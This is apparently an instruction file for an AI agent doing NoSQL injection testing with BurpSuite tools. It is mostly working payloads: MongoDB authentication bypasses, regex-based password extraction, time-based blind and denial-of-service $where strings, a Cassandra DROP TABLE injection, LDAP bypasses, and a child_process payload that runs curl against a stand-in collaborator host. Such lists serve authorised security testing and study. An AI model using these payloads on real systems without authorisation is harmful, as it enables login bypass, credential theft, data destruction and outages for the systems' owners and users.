# NoSQL Injection Detection Skill

## Objective
Identify NoSQL injection vulnerabilities in applications using MongoDB, CouchDB, Redis, and other NoSQL databases.

## Instructions

### 1. Identify NoSQL-Backed Endpoints
Look for:
- JSON-based APIs
- Dynamic query parameters
- Modern web applications
- Document storage patterns
- Key-value operations

### 2. MongoDB Injection

**Operator injection:**
```json
// Authentication bypass
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

**URL-encoded payloads:**
```
username=admin&password[$ne]=wrongpassword
username=admin&password[$gt]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
```

**$where injection:**
```json
{"$where": "this.username == 'admin'"}
{"$where": "sleep(5000)"}
{"$where": "this.password.match(/^a/) && sleep(5000)"}
```

**Blind injection:**
```json
// Time-based
{"$where": "sleep(5000)"}
{"$where": "this.password.match(/^a/) ? sleep(5000) : 1"}

// Boolean-based
{"$where": "this.password.match(/^a/)"}  // vs
{"$where": "this.password.match(/^z/)"}
```

### 3. MongoDB Query Selectors

**Comparison:**
```
$eq - Equal
$ne - Not equal
$gt - Greater than
$gte - Greater than or equal
$lt - Less than
$lte - Less than or equal
$in - In array
$nin - Not in array
```

**Logical:**
```
$and - AND
$or - OR
$not - NOT
$nor - NOR
```

**Element:**
```
$exists - Field exists
$type - Field type
```

**Regex:**
```
$regex - Regular expression match
```

### 4. MongoDB Data Extraction

**Enumerate password character by character:**
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
{"username": "admin", "password": {"$regex": "^c"}}
...
{"username": "admin", "password": {"$regex": "^pa"}}
{"username": "admin", "password": {"$regex": "^pas"}}
```

**Time-based extraction:**
```javascript
{"$where": "if(this.password.match(/^a/)){sleep(5000)}"}
```

### 5. NoSQL JavaScript Injection

**Server-side JavaScript:**
```javascript
// In $where clause
"1==1"
"this.username == 'admin'"
"this.password.length > 0"

// DoS
"while(1){}"
"for(var i=0;i<100000000;i++){}"

// Data extraction
"this.password"
```

### 6. CouchDB Injection

**View injection:**
```
/_all_docs?startkey="_design/"&endkey="_design0"
/_all_docs?include_docs=true
```

**Query manipulation:**
```json
{"selector": {"password": {"$gt": null}}}
{"selector": {"$or": [{"password": "test"}, {"_id": {"$gt": null}}]}}
```

### 7. Redis Injection

**Command injection:**
```
EVAL "return redis.call('keys','*')" 0
CONFIG GET *
INFO
DEBUG SLEEP 5
```

**Lua script injection:**
```
EVAL "return 1" 0
EVAL "return redis.call('get','password')" 0
```

### 8. Cassandra CQL Injection

**Similar to SQL injection:**
```cql
' OR '1'='1
'; DROP TABLE users--
'; SELECT * FROM system_schema.tables--
```

### 9. GraphQL Injection

**Query manipulation:**
```graphql
{
  users(filter: {or: [{id: {gt: 0}}]}) {
    id
    email
    password
  }
}
```

**Introspection for enumeration:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

### 10. LDAP Injection (Related)

**Authentication bypass:**
```
username=*
username=admin)(&)
username=admin)(|(password=*)
password=*)(uid=*))(|(uid=*
```

### 11. Operator Injection via Arrays

**PHP/Node.js array injection:**
```
username[]=admin&password[$ne]=test
login[$gt]=&login[$lt]=z
```

**JSON array injection:**
```json
{"username": ["admin"], "password": {"$ne": ""}}
```

### 12. Bypass Techniques

**Unicode bypass:**
```json
{"user\u006eame": "admin"}
```

**Type juggling:**
```json
{"username": {"$type": 2}, "password": {"$ne": ""}}
```

**Nested objects:**
```json
{"credentials": {"username": "admin", "password": {"$ne": ""}}}
```

### 13. Detection via Collaborator

**MongoDB OOB:**
```javascript
{"$where": "this.password && (new Function('return this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").exec(\"curl COLLABORATOR\");'))()"}
```

### 14. Error-Based Detection

**Trigger errors:**
```json
{"$where": "invalid syntax here"}
{"username": {"$invalidOperator": 1}}
```

**Analyze error messages for:**
- Database type
- Query structure
- Field names

### 15. Confirm and Document
If confirmed, create finding with:
- Vulnerable endpoint/parameter
- NoSQL database type
- Injection type (operator, JS, blind)
- Working payload
- Evidence (auth bypass, data extraction)
- Impact assessment

## MCP Tools to Use

### BurpSuite
- `http1_request` / `http2_request`: Send test payloads
- `repeater_tab_with_payload`: Manual testing
- `intruder_prepare`: Automate extraction
- `collaborator_generate` / `collaborator_poll`: OOB detection

## Keywords
nosql, mongodb injection, mongo injection

## References
- PayloadsAllTheThings/NoSQL Injection
- OWASP NoSQL Injection
- MongoDB Security
